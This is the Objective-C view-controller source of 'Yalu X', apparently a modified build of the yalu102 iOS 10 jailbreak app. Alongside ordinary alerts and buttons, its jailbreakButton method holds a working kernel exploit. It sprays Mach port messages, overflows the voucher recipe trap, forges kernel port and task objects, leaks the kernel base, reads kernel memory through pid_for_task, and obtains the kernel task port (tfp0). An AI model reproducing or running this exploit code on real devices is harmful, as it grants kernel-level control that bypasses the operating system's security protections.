//
//  ViewController.m
//  yalu102
//
//  Created by qwertyoruiop on 05/01/2017.
//  Copyright © 2017 kimjongcracks. All rights reserved.
//
//  Other code including the following: Reinstallation function and dropbear fix by MTAC, all other credit to kimjongcracks
//

#import "offsets.h"
#import "ViewController.h"
#import <mach-o/loader.h>
#import <sys/mman.h>
#import <pthread.h>
#undef __IPHONE_OS_VERSION_MIN_REQUIRED
#import <mach/mach.h>
#import "devicesupport.h"
#import <sys/mount.h>
#import <spawn.h>
#import <copyfile.h>
#import <mach-o/dyld.h>
#import <sys/types.h>
#import <sys/stat.h>
#import <sys/utsname.h>
#include <sys/utsname.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <spawn.h>


extern uint64_t procoff;

typedef struct {
    mach_msg_header_t head;
    mach_msg_body_t msgh_body;
    mach_msg_ool_ports_descriptor_t desc[256];
    char pad[4096];
} sprz;

@interface UILabel ()

@end

@interface ViewController ()

@property (nonatomic, strong) UIProgressView *progressView;

@end

@implementation ViewController

- (UIStatusBarStyle)preferredStatusBarStyle {

    return UIStatusBarStyleLightContent;
    
}

- (void)viewDidLoad {
    [super viewDidLoad];
    init_offsets();
    struct utsname u = { 0 };
    uname(&u);
    

    /*if (strstr(u.version, "MarijuanARM")) {
        [dope setEnabled:NO];
        [dope setTitle:@"already jailbroken" forState:UIControlStateDisabled];
    
    
    }*/
    
    NSString *hardware = [self hardwareString];
    
    if ([hardware isEqualToString:@"iPhone8,4"]) {
        
        
        
    }
    
    if ([hardware isEqualToString:@"iPhone6,1"]) {
        
        
        
    }

    if ([hardware isEqualToString:@"iPhone6,2"]) {
        
        
        
    }


    self.progressView = [[UIProgressView alloc] initWithProgressViewStyle:UIProgressViewStyleDefault];
    
    self.progressView.center = self.view.center;
    
    [self.view addSubview:self.progressView];
    
    
    
    UIViewController * contributeViewController = [[UIViewController alloc] init];
    
    UIBlurEffect * blurEffect = [UIBlurEffect effectWithStyle:UIBlurEffectStyleLight];
    
    UIVisualEffectView *beView = [[UIVisualEffectView alloc] initWithEffect:blurEffect];
    
    beView.frame = self.view.bounds;
    
    contributeViewController.view.frame = self.view.bounds;
    
    contributeViewController.view.backgroundColor = [UIColor clearColor];
    
    [contributeViewController.view insertSubview:beView atIndex:0];
    
    contributeViewController.modalPresentationStyle = UIModalPresentationOverCurrentContext;
    
    #define kAppHasRunBeforeKey @"appFirstTimeRun"
    if (![[[NSUserDefaults standardUserDefaults] valueForKey:kAppHasRunBeforeKey] boolValue]) {
       
        
        UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"Hello!" message:@"This version of Yalu X was written by MTAC (@MTAC8) on top of Luca Todesco (@qwertyoruiopz) & Marco Grassi (@marcograss) jailbreak for iOS 10. All modifications in this version are done by MTAC. Please do not claim it as your own." preferredStyle:UIAlertControllerStyleAlert];
        
        UIAlertAction* ok = [UIAlertAction actionWithTitle:@"Got it!" style:UIAlertActionStyleDefault handler:nil];
        [alertController addAction:ok];
        
        [self presentViewController:alertController animated:YES completion:nil];
        
        
        [[NSUserDefaults standardUserDefaults] setBool:YES forKey:kAppHasRunBeforeKey];
    }
    
}

- (NSString*)hardwareDescription {
    NSString *hardware = [self hardwareString];
  
    if ([hardware isEqualToString:@"iPhone9,1"]) return @"iPhone 7";
    if ([hardware isEqualToString:@"iPhone9,2"]) return @"iPhone 7+";
    if ([hardware isEqualToString:@"iPhone9,3"]) return @"iPhone 7";
    if ([hardware isEqualToString:@"iPhone9,4"]) return @"iPhone 7+";
    
    return nil;
}

- (IBAction)cache:(UIButton *)sender {

    system("uicache");

}

- (NSString*)hardwareString {
    size_t size = 100;
    char *hw_machine = malloc(size);
    int name[] = {CTL_HW,HW_MACHINE};
    sysctl(name, 2, hw_machine, &size, NULL, 0);
    NSString *hardware = [NSString stringWithUTF8String:hw_machine];
    free(hw_machine);
    return hardware;
}



- (IBAction)githubButton:(UIButton *)sender {

    UIApplication *application = [UIApplication sharedApplication];
    NSURL *URL = [NSURL URLWithString:@"https://github.com/MTAC-Research/Yalu-X"];
    [application openURL:URL options:@{} completionHandler:^(BOOL success) {
        if (success) {
            NSLog(@"Done");
        }
    }];
}

- (IBAction)twitterButton:(UIButton *)sender {

    UIApplication *application = [UIApplication sharedApplication];
    NSURL *URL = [NSURL URLWithString:@"https://twitter.com/mtac8"];
    [application openURL:URL options:@{} completionHandler:^(BOOL success) {
        if (success) {
            NSLog(@"Done");
        }
    }];


}

typedef natural_t not_natural_t;
struct not_essers_ipc_object {
    not_natural_t io_bits;
    not_natural_t io_references;
    char    io_lock_data[1337];
    
};

- (IBAction)rebootButton:(UIButton *)sender {

    
    // Fuck how do I implement this?
    
    /* rebootqueue(1.0, ^
                {
                    system("reboot");
                });
 
     */
    
}

- (IBAction)deviceButton:(UIButton *)sender {

    UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"Current Support" message:@"iPad Pro: iOS 10.0 - 10.2\n iPad Air: iOS 10.0 - 10.2\n iPad Air 2: iOS 10.0 - 10.2\n iPad Mini 2: iOS 10.0 - 10.2\n iPad Mini 3: iOS 10.0 - 10.2\n iPad Mini 4: iOS 10.0 - 10.2\n iPod Touch 6G: iOS 10.0 - 10.2\n iPhone 5s: iOS 10.0 - 10.2\n iPhone 6(+): iOS 10.0 - 10.2\n iPhone 6s(+): iOS 10.0 - 10.2\n iPhone 7(+): Not supported by Yalu 10.2, please use yalu+mach_portal." preferredStyle:UIAlertControllerStyleAlert];
    
    UIAlertAction* ok = [UIAlertAction actionWithTitle:@"Got it!" style:UIAlertActionStyleDefault handler:nil];
    [alertController addAction:ok];
    
    [self presentViewController:alertController animated:YES completion:nil];
}

- (IBAction)reinstallSwitch:(UISwitch *)sender {


    if (sender.isOn) {
       
        NSString *filePath = @"/Applications/Cydia.app";
        
        NSString *yalu = @"/.installed_yaluX";
        
        BOOL installed = [[NSFileManager defaultManager] fileExistsAtPath:yalu];
        
        BOOL cydiaExists = [[NSFileManager defaultManager] fileExistsAtPath:filePath];
        
        if ((installed & cydiaExists) == YES) {
        
            UIAlertController * alert = [UIAlertController
                                         alertControllerWithTitle:@"Uh Oh!"
                                         message:@"The file '/.installed_yaluX' exists. This means you are still jailbroken. Is Cydia on your homescreen?"
                                         preferredStyle:UIAlertControllerStyleAlert];
            
            UIAlertAction* yesButton = [UIAlertAction
                                        actionWithTitle:@"Yes"
                                        style:UIAlertActionStyleDefault
                                        handler:^(UIAlertAction * action) {
                                            
                                           //Execute conformation code here
                                            
                                           UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"Ok" message:@"It looks like you're all set!" preferredStyle:UIAlertControllerStyleAlert];
                                            
                                            UIAlertAction* ok = [UIAlertAction actionWithTitle:@"Thanks!" style:UIAlertActionStyleDefault handler:nil];
                                            [alertController addAction:ok];
                                            
                                            [self presentViewController:alertController animated:YES completion:nil];
                                            
                                        }];
            
            UIAlertAction* noButton = [UIAlertAction
                                       actionWithTitle:@"No"
                                       style:UIAlertActionStyleDefault
                                       handler:^(UIAlertAction * action) {
                                           
                                           UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"Still need help?" message:@"Try running the command 'uicache' via SSH. If this doesn't work, visit 'https://github.com/MTAC-Research/Yalu-X/blob/master/README.md' for a fix" preferredStyle:UIAlertControllerStyleAlert];
                                           
                                           UIAlertAction* ok = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil];
                                           [alertController addAction:ok];
                                           
                                           [self presentViewController:alertController animated:YES completion:nil];
                                           
                                       }];
            
            [alert addAction:yesButton];
            [alert addAction:noButton];
            
            [self presentViewController:alert animated:YES completion:nil];
            
            [sender setOn:false];

            
            
            
            
            
            
            
            
            
            
            
            
            
            UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"Uh Oh!" message:@"/.installed_yaluX exists in the root directory. This means you're still jailbroken!" preferredStyle:UIAlertControllerStyleAlert];
            
            UIAlertAction* ok = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil];
            [alertController addAction:ok];
            
            [self presentViewController:alertController animated:YES completion:nil];
            
        }
        
        [sender setOn:false];
        
    }
}


- (IBAction)dropBear:(UISwitch *)sender {

    if (sender.isOn) {
        
        UIAlertController * alert = [UIAlertController
                                     alertControllerWithTitle:@"Fix DropBear SSH?"
                                     message:@"This modifies your jailbreak. If anything goes wrong, the responsibilty is yours. Continue?"
                                     preferredStyle:UIAlertControllerStyleAlert];
        
        UIAlertAction* yesButton = [UIAlertAction
                                    actionWithTitle:@"Yes"
                                    style:UIAlertActionStyleDefault
                                    handler:^(UIAlertAction * action) {
                                        
                                        //Execute conformation code here
                                        
                                        UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"Fixed!" message:@"DropBear .plist has been fixed, may take a reboot to work." preferredStyle:UIAlertControllerStyleAlert];
                                        
                                        UIAlertAction* ok = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil];
                                        [alertController addAction:ok];
                                        
                                        [self presentViewController:alertController animated:YES completion:nil];

                                    }];
        
        UIAlertAction* noButton = [UIAlertAction
                                   actionWithTitle:@"No"
                                   style:UIAlertActionStyleDefault
                                   handler:^(UIAlertAction * action) {
                                       //Handle no, thanks button
                                   }];
        
        [alert addAction:yesButton];
        [alert addAction:noButton];
        
        [self presentViewController:alert animated:YES completion:nil];
        
        [sender setOn:false];
    
    }

}

#define IO_BITS_ACTIVE 0x80000000
#define	IKOT_TASK 2
#define IKOT_IOKIT_CONNECT 29
#define IKOT_CLOCK 25

char dt[128];

- (IBAction)jailbreakButton:(UIButton *)sender {

    // ---Beginning of device detection---
  
    NSString *hardware = [self hardwareString];
        
    if ([hardware isEqualToString:@"iPhone9,1"]) {
        
        // Going to put mach_portal in here somewhere if possible.
        
    }
    
    
    _progressView.progress = 0.0f;
    
    mach_port_t vch = 0;
    
    mach_voucher_attr_recipe_data_t *data = malloc(sizeof(mach_voucher_attr_recipe_data_t) + 0x10);
    data->content_size = 0;
    data->key=MACH_VOUCHER_ATTR_KEY_BANK;
    data->command=610;
    data->previous_voucher=MACH_PORT_NULL;
    
    kern_return_t lol = host_create_mach_voucher(mach_host_self(), data, sizeof(mach_voucher_attr_recipe_data_t), &vch);
    
    assert(lol==0 && vch!=0);
    
    
    unsigned char* odata = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    unsigned char* fdata = mmap(odata+0x4000, 0x4000, PROT_NONE, MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
    assert(fdata == odata + 0x4000);
    memset(odata, 0x42, 0x0);
    
    
    uint64_t rsz = 0x100; // alloc size;
    fdata -= rsz + 0x100; // overflow full chunk
    
    struct not_essers_ipc_object* fakeport = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    
    mlock(fakeport, 0x8000);
    
    fakeport->io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;
    fakeport->io_lock_data[12] = 0x11;
    
    *(uint64_t*) (fdata + rsz) = (uint64_t) fakeport;
    
    
    mach_port_t* ports = calloc(800, sizeof(mach_port_t));
    
    for (int i = 0; i < 800; i++) {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
        mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
    }
    
    _progressView.progress = 0.5f;
    
    sprz msg1;
    
    memset(&msg1, 0, sizeof(sprz));
    sprz msg2;
    
    memset(&msg2, 0, sizeof(sprz));
    msg1.msgh_body.msgh_descriptor_count = 128;
    
    msg1.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    msg1.head.msgh_local_port = MACH_PORT_NULL;
    msg1.head.msgh_size = sizeof(msg1)-2048;
    
    mach_port_t* buffer = calloc(0x1000, sizeof(mach_port_t));
    for (int i = 0; i < 0x1000; i++) {
        buffer[i] = MACH_PORT_DEAD;
    }
    
    for (int i = 0; i < 256; i++) {
        msg1.desc[i].address = buffer;
        msg1.desc[i].count = 0x100/8;
        msg1.desc[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        msg1.desc[i].disposition = 19;
    }
    
    _progressView.progress = 1.0f;
    
    pthread_yield_np();
    for (int i=1; i<300; i++) {
        msg1.head.msgh_remote_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }
    
    pthread_yield_np();
    for (int i=500; i<800; i++) {
        msg1.head.msgh_remote_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }
    
    pthread_yield_np();
    for (int i=300; i<500; i++) {
        msg1.head.msgh_remote_port = ports[i];
        if (i%4 == 0) {
            msg1.msgh_body.msgh_descriptor_count = 1;
        } else {
            msg1.msgh_body.msgh_descriptor_count = 256;
        }
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }
    
    pthread_yield_np();
    for (int i = 300; i<500; i+=4) {
        msg2.head.msgh_local_port = ports[i];
        kern_return_t kret = mach_msg(&msg2.head, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
        if(!(i < 380))
            ports[i] = 0;
        assert(kret==0);
    }
    for (int i = 300; i<380; i+=4) {
        msg1.head.msgh_remote_port = ports[i];
        msg1.msgh_body.msgh_descriptor_count = 1;
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }
    
    mach_voucher_extract_attr_recipe_trap(vch, MACH_VOUCHER_ATTR_KEY_BANK, fdata, &rsz);
    mach_port_t foundport = 0;
    for (int i=1; i<500; i++) {
        if (ports[i]) {
            msg1.head.msgh_local_port = ports[i];
            pthread_yield_np();
            kern_return_t kret = mach_msg(&msg1, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
            assert(kret==0);
            for (int k = 0; k < msg1.msgh_body.msgh_descriptor_count; k++) {
                mach_port_t* ptz = msg1.desc[k].address;
                for (int z = 0; z < 0x100/8; z++) {
                    if (ptz[z] != MACH_PORT_DEAD) {
                        if (ptz[z]) {
                            foundport = ptz[z];
                            goto foundp;
                        }
                        
                    }
                }
            }
            mach_msg_destroy(&msg1.head);
            mach_port_deallocate(mach_task_self(), ports[i]);
            ports[i] = 0;
        }
    }
    [sender setTitle:@"Jailbreak" forState:UIControlStateNormal];
    return;
    
foundp:
    NSLog(@"found corruption %x", foundport);
    
    uint64_t textbase = 0xfffffff007004000;
    
    for (int i = 0; i < 0x300; i++) {
        for (int k = 0; k < 0x40000; k+=8) {
            *(uint64_t*)(((uint64_t)fakeport) + 0x68) = textbase + i*0x100000 + 0x500000 + k;
            *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
            
            kern_return_t kret = clock_sleep_trap(foundport, 0, 0, 0, 0);
            
            if (kret != KERN_FAILURE) {
                goto gotclock;
            }
        }
    }
    [sender setTitle:@"Jailbreak" forState:UIControlStateNormal];
    return;
    
gotclock:;
    uint64_t leaked_ptr =  *(uint64_t*)(((uint64_t)fakeport) + 0x68);
    
    leaked_ptr &= ~0x3FFF;
    
    fakeport->io_bits = IKOT_TASK|IO_BITS_ACTIVE;
    fakeport->io_references = 0xff;
    char* faketask = ((char*)fakeport) + 0x1000;
    
    *(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
    *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
    *(uint64_t*) (faketask + 0x10) = 0xee;
    
    while (1) {
        int32_t leaked = 0;
        *(uint64_t*) (faketask + procoff) = leaked_ptr - 0x10;
        pid_for_task(foundport, &leaked);
        if (leaked == MH_MAGIC_64) {
            NSLog(@"found kernel text at %llx", leaked_ptr);
            break;
        }
        leaked_ptr -= 0x4000;
    }
    
    uint64_t kernel_base = leaked_ptr;
    
    uint64_t allproc = allproc_offset + kernel_base;
    
    uint64_t proc_ = allproc;
    
    uint64_t myproc = 0;
    uint64_t kernproc = 0;
    
    while (proc_) {
        uint64_t proc = 0;
        
        *(uint64_t*) (faketask + procoff) = proc_ - 0x10;
        pid_for_task(foundport, (int32_t*)&proc);
        *(uint64_t*) (faketask + procoff) = 4 + proc_ - 0x10;
        pid_for_task(foundport, (int32_t*)(((uint64_t)(&proc)) + 4));
        
        int pd = 0;
        *(uint64_t*) (faketask + procoff) = proc;
        pid_for_task(foundport, &pd);
        
        if (pd == getpid()) {
            myproc = proc;
        } else if (pd == 0){
            kernproc = proc;
        }
        proc_ = proc;
    }
    
    uint64_t kern_task = 0;
    *(uint64_t*) (faketask + procoff) = kernproc - 0x10 + 0x18;
    pid_for_task(foundport, (int32_t*)&kern_task);
    *(uint64_t*) (faketask + procoff) = 4 + kernproc - 0x10 + 0x18;
    pid_for_task(foundport, (int32_t*)(((uint64_t)(&kern_task)) + 4));
    
    uint64_t itk_kern_sself = 0;
    *(uint64_t*) (faketask + procoff) = kern_task - 0x10 + 0xe8;
    pid_for_task(foundport, (int32_t*)&itk_kern_sself);
    *(uint64_t*) (faketask + procoff) = 4 + kern_task - 0x10 + 0xe8;
    pid_for_task(foundport, (int32_t*)(((uint64_t)(&itk_kern_sself)) + 4));
    
    char* faketaskport = malloc(0x1000);
    char* ktaskdump = malloc(0x1000);
    
    for (int i = 0; i < 0x1000/4; i++) {
        *(uint64_t*) (faketask + procoff) = itk_kern_sself - 0x10 + i*4;
        pid_for_task(foundport, (int32_t*)(&faketaskport[i*4]));
    }
    for (int i = 0; i < 0x1000/4; i++) {
        *(uint64_t*) (faketask + procoff) = kern_task - 0x10 + i*4;
        pid_for_task(foundport, (int32_t*)(&ktaskdump[i*4]));
    }
    
    memcpy(fakeport, faketaskport, 0x1000);
    memcpy(faketask, ktaskdump, 0x1000);
    
    mach_port_t pt = 0;
    
    *(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
    *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
    
    *(uint64_t*)(((uint64_t)faketask) + 0x2b8) = itk_kern_sself;
    
    task_get_special_port(foundport, 4, &pt); // get tfp0
    NSLog(@"got tfp0 -> %x", pt);
    fakeport->io_bits = 0;
    
    extern uint64_t slide;
    slide = kernel_base - 0xFFFFFFF007004000;
    
    void exploit(void*, mach_port_t, uint64_t, uint64_t);
    exploit(sender, pt, kernel_base, allproc_offset);
    
    
    
    
    UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"Success!" message:@"Jailbreak complete. Please wait for a respring..." preferredStyle:UIAlertControllerStyleAlert];
        
        UIAlertAction* ok = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil];
        [alertController addAction:ok];
        
        [self presentViewController:alertController animated:YES completion:nil];
    
}



- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}


@end
